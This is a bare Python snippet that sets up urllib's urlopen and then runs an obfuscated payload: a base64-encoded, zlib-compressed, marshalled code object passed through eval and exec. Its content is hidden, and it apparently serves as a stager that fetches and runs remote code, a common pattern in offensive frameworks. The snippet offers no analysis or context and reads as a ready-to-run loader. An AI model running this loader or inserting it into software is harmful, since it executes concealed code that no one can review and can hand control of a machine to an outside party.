import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmZgYCgtyskvSM3TUM8oKSmw0tc3NDfSM7LQMzbVMzQ2tjI0MjbV1y8uSUxPLSrWLw3K1CuoVNfUK0pNTNHQBAA+2hIl')))))